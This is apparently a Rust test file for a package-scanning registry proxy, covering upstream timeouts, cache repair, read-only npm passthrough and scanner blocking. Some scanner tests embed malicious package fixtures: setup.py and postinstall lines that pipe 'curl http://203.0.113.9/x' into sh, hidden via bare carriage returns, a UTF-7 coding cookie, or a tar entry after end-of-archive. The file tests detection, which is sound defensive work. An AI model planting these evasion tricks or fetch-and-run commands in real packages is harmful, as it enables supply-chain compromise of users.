async fn raw_upstream(head: &'static str, body: Vec<u8>, gap: Option<Duration>) -> String {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
    tokio::spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let body = body.clone();
            tokio::spawn(async move {
                let mut buf = [0u8; 4096];
                let _ = s.read(&mut buf).await;
                if s.write_all(head.as_bytes()).await.is_err() {
                    return;
                }
                match gap {
                    None => {
                        let _ = s.write_all(&body).await;
                    }
                    Some(g) => {
                        for b in body {
                            if s.write_all(&[b]).await.is_err() {
                                return;
                            }
                            tokio::time::sleep(g).await;
                        }
                    }
                }
                let _ = s.shutdown().await;
            });
        }
    });
    base
}

#[tokio::test(flavor = "multi_thread")]
async fn a_cut_off_npm_passthrough_body_is_a_502() {
    let base = raw_upstream(
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 100\r\n\r\n",
        b"{\"objects\":[".to_vec(),
        None,
    )
    .await;
    let h = Harness::start(|p| p.upstream.npm = base).await;
    let r = h.get("/npm/-/v1/search?text=left-pad").await;
    assert_eq!(r.status(), 502);
    assert!(r.text().await.unwrap().contains("upstream"));
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_download_that_drips_is_abandoned() {
    let files = raw_upstream(
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 600\r\n\r\n",
        vec![b'x'; 600],
        Some(Duration::from_millis(100)),
    )
    .await;
    let limits = Limits {
        download_timeout: Duration::from_secs(1),
        ..Limits::default()
    };
    let h = Harness::start_full(|p| p.upstream.pypi_files = files, None, limits).await;
    let r = tokio::time::timeout(
        Duration::from_secs(20),
        h.get(&pypi_file_path("goodpkg", "1.0.0")),
    )
    .await
    .expect("the download was never cut off");
    assert_eq!(r.status(), 502);
    let tmp = h._dir.path().join("cache").join("tmp");
    assert_eq!(
        std::fs::read_dir(&tmp).unwrap().count(),
        0,
        "partial download left behind"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_truncated_cached_archive_is_downloaded_again() {
    let h = Harness::start(|_| {}).await;
    let path = pypi_file_path("goodpkg", "1.0.0");
    let r = h.get(&path).await;
    assert_eq!(r.status(), 200);
    let whole = r.bytes().await.unwrap();
    let blob = std::fs::read_dir(h._dir.path().join("cache"))
        .unwrap()
        .flatten()
        .filter(|d| d.file_name().len() == 2)
        .flat_map(|d| std::fs::read_dir(d.path()).unwrap().flatten())
        .map(|f| f.path())
        .next()
        .unwrap();
    std::fs::write(&blob, &whole[..1]).unwrap();

    let r = h.get(&path).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.bytes().await.unwrap(), whole);
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 2);
    h.stop().await;
}

/// An offline engine with the real scanner and the dev models.
fn real_scanner_engine(edit: impl FnOnce(&mut Policy)) -> (tempfile::TempDir, Arc<Engine>) {
    let dir = tempfile::tempdir().unwrap();
    let mut policy = Policy::default();
    edit(&mut policy);
    let engine = Engine::new(EngineConfig {
        data_dir: dir.path().to_path_buf(),
        models: dev_models(),
        policy,
        policy_path: dir.path().join("policy.toml"),
        scanner: customs::engine::default_scanner(),
        limits: Limits::default(),
        metrics: Arc::new(Metrics::new()),
    })
    .unwrap();
    (dir, engine)
}

const DEMO_PKG_INFO: &str = "Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\n";

#[tokio::test(flavor = "multi_thread")]
async fn install_code_hidden_from_the_feature_pass_is_blocked() {
    // Inert text: the scanner only ever lexes it. CPython ends a line at a bare CR, so
    // this setup.py runs `os.system(...)`; the feature lexers read one comment.
    let archive = npm_tgz(&[
        ("demo-1.0.0/PKG-INFO", DEMO_PKG_INFO),
        (
            "demo-1.0.0/setup.py",
            "# setup\rimport os\ros.system('curl http://203.0.113.9/x | sh')\r",
        ),
    ]);
    let (_dir, engine) = real_scanner_engine(|_| {});
    let v = engine.scan_local(&archive, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
    assert_eq!(v.decision, customs_model::Decision::Block);
    let hit = v.policy_hits.iter().find(|h| h.rule == "hidden_code");
    let hit = hit.unwrap_or_else(|| panic!("{:?}", v.policy_hits));
    assert_eq!(hit.severity, customs_model::Decision::Block);
    assert!(
        hit.detail.starts_with("setup.py:3: proc_exec"),
        "{}",
        hit.detail
    );

    let (_dir, engine) = real_scanner_engine(|p| p.hidden_code = RuleSeverity::Off);
    let v = engine.scan_local(&archive, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
    assert!(!v.policy_hits.iter().any(|h| h.rule == "hidden_code"));
}

#[tokio::test(flavor = "multi_thread")]
async fn install_code_the_installer_reads_differently_is_blocked() {
    let (_dir, engine) = real_scanner_engine(|_| {});
    // A coding cookie that makes Python decode setup.py into different code.
    let cookie = npm_tgz(&[
        ("demo-1.0.0/PKG-INFO", DEMO_PKG_INFO),
        (
            "demo-1.0.0/setup.py",
            "# -*- coding: utf-7 -*-\n# +AAo-import os; os.system('id')\n",
        ),
    ]);
    let v = engine.scan_local(&cookie, "demo-1.0.0.tar.gz", Ecosystem::Pypi, None);
    assert_eq!(v.decision, customs_model::Decision::Block);
    let hit = v.policy_hits.iter().find(|h| h.rule == "unread_code");
    let hit = hit.unwrap_or_else(|| panic!("{:?}", v.policy_hits));
    assert!(
        hit.detail.contains("declares coding utf-7"),
        "{}",
        hit.detail
    );

    // A tar entry after an end-of-archive block, which node-tar still extracts.
    let entry = |data: &[u8]| {
        let mut b = tar::Builder::new(Vec::new());
        let mut h = tar::Header::new_gnu();
        h.set_size(data.len() as u64);
        h.set_mode(0o644);
        b.append_data(&mut h, "package/package.json", data).unwrap();
        b.into_inner().unwrap()
    };
    let mut tar = entry(br#"{"name":"demo","version":"1.0.0"}"#);
    tar.truncate(tar.len() - 1024);
    tar.extend([0u8; 512]);
    tar.extend(entry(
        br#"{"name":"demo","version":"1.0.0","scripts":{"postinstall":"curl http://203.0.113.9/x | sh"}}"#,
    ));
    let v = engine.scan_local(&tar, "demo-1.0.0.tgz", Ecosystem::Npm, Some("demo"));
    assert_eq!(v.decision, customs_model::Decision::Block);
    assert!(
        v.policy_hits.iter().any(|h| h.rule == "scan_error"),
        "{:?}",
        v.policy_hits
    );
}

/// `Limits::max_concurrent_scans` bounds how many archives are scanned at once, so a burst
/// of distinct large packages cannot hold every one of them in memory together.
#[tokio::test(flavor = "multi_thread")]
async fn scans_wait_for_a_free_slot() {
    let mock = start_mock().await;
    let dir = tempfile::tempdir().unwrap();
    let mut policy = Policy::default();
    policy.upstream.pypi_simple = format!("{}/simple", mock.base);
    policy.upstream.pypi_files = format!("{}/files", mock.base);
    policy.upstream.pypi_json = format!("{}/pypi", mock.base);
    policy.upstream.npm = format!("{}/npm", mock.base);
    let (now, peak) = (Arc::new(AtomicUsize::new(0)), Arc::new(AtomicUsize::new(0)));
    let inner = fake_scanner(Arc::new(AtomicUsize::new(0)));
    let scanner: ScanFn = {
        let (now, peak) = (now.clone(), peak.clone());
        Arc::new(move |b: &[u8], f: &str, e: Ecosystem| {
            let n = now.fetch_add(1, Ordering::SeqCst) + 1;
            peak.fetch_max(n, Ordering::SeqCst);
            std::thread::sleep(Duration::from_millis(150));
            now.fetch_sub(1, Ordering::SeqCst);
            inner(b, f, e)
        })
    };
    let engine = Engine::new(EngineConfig {
        data_dir: dir.path().to_path_buf(),
        models: dev_models(),
        policy,
        policy_path: dir.path().join("policy.toml"),
        scanner,
        limits: Limits {
            max_concurrent_scans: 1,
            ..Limits::default()
        },
        metrics: Arc::new(Metrics::new()),
    })
    .unwrap();
    let mut tasks = Vec::new();
    for (name, version) in [
        ("goodpkg", "1.0.0"),
        ("goodpkg", "1.1.0"),
        ("rolling", "1.0.0"),
    ] {
        let e = engine.clone();
        tasks.push(tokio::spawn(async move {
            e.check_resolving(Ecosystem::Pypi, name, Some(version), None, false)
                .await
                .map(|v| v.decision)
        }));
    }
    for t in tasks {
        t.await.unwrap().unwrap();
    }
    assert_eq!(peak.load(Ordering::SeqCst), 1);
}

/// Registry metadata that cannot be read leaves the release's age unknown, which the
/// release-age rule treats like a release the metadata does not list: an upstream that
/// times out or sends garbage for the packument must not let a brand-new version through.
#[tokio::test(flavor = "multi_thread")]
async fn unreadable_registry_metadata_does_not_skip_the_age_rule() {
    let garbage = start_garbage_registry().await;
    let h = Harness::start(|p| {
        p.upstream.npm = format!("{garbage}/npm");
        p.upstream.pypi_json = format!("{garbage}/pypi");
        p.upstream.pypi_files = format!("{garbage}/files");
    })
    .await;
    let r = h.get("/npm/broken-pkg/-/broken-pkg-1.0.0.tgz").await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("min_age_days"), "{body}");
    assert!(body.contains("could not be read"), "{body}");
    let r = h
        .get("/pypi/files/ab/cd/broken_pkg-1.0.0-py3-none-any.whl")
        .await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("min_age_days"), "{body}");
    h.stop().await;
}

/// The npm proxy is read-only: registry endpoints pass through for reads, and the only
/// writes forwarded are `npm audit`'s advisory queries. Nothing else may reach the
/// upstream with the proxy's registry credentials (moving a dist-tag, creating a token).
#[tokio::test(flavor = "multi_thread")]
async fn npm_passthrough_forwards_only_reads_and_audit_queries() {
    let h = Harness::start(|_| {}).await;
    for (method, path) in [
        ("PUT", "/npm/-/package/plainlib/dist-tags/latest"),
        ("DELETE", "/npm/-/package/plainlib/dist-tags/beta"),
        ("POST", "/npm/-/npm/v1/tokens"),
        ("PUT", "/npm/-/user/org.couchdb.user:someone"),
    ] {
        let r = h
            .http
            .request(
                reqwest::Method::from_bytes(method.as_bytes()).unwrap(),
                format!("{}{path}", h.base),
            )
            .body("{}")
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 405, "{method} {path}");
        assert!(
            r.text().await.unwrap().contains("read-only"),
            "{method} {path}"
        );
    }
    let r = h.get("/npm/-/v1/search?text=plain").await;
    assert_eq!(r.status(), 200);
    // Audit queries are forwarded: the answer is the mock registry's own (it has no audit
    // endpoint), not the proxy's refusal.
    let r = h
        .http
        .post(format!("{}/npm/-/npm/v1/security/advisories/bulk", h.base))
        .json(&json!({}))
        .send()
        .await
        .unwrap();
    assert!(!r.text().await.unwrap().contains("read-only"));
    h.stop().await;
}

/// A download that cannot be moved into the cache leaves no partial file behind.
#[tokio::test(flavor = "multi_thread")]
async fn failed_cache_writes_leave_no_partial_downloads() {
    let h = Harness::start(|_| {}).await;
    let cache = h._dir.path().join("cache");
    // Every blob directory name is taken by a file, so moving the download fails.
    for i in 0..256 {
        std::fs::write(cache.join(format!("{i:02x}")), b"").unwrap();
    }
    let (s, v) = h.check("pypi", "goodpkg", Some("1.0.0")).await;
    assert_eq!(s, 500, "{v}");
    let left: Vec<_> = std::fs::read_dir(cache.join("tmp"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name())
        .collect();
    assert!(left.is_empty(), "{left:?}");
    h.stop().await;
}

/// The same bytes under another file name are scanned again: the scanner reads a wheel and
/// an sdist differently, so a summary of one must not answer for the other.
#[tokio::test(flavor = "multi_thread")]
async fn scan_summaries_are_kept_per_file_name() {
    let h = Harness::start(|_| {}).await;
    let old = "2020-01-01T00:00:00.000000Z".to_string();
    for f in ["twin-1.0.zip", "twin-1.0-py3-none-any.whl"] {
        h.mock.extra_pypi.lock().unwrap().push(ExtraFile::new(
            "twin",
            "1.0",
            f,
            b"benign twin",
            old.clone(),
        ));
    }
    for f in ["twin-1.0.zip", "twin-1.0-py3-none-any.whl"] {
        let r = h.get(&format!("/pypi/files/packages/ab/cd/{f}")).await;
        assert_eq!(r.status(), 200, "{f}");
    }
    assert_eq!(h.scans.load(Ordering::SeqCst), 2);
    h.stop().await;
}
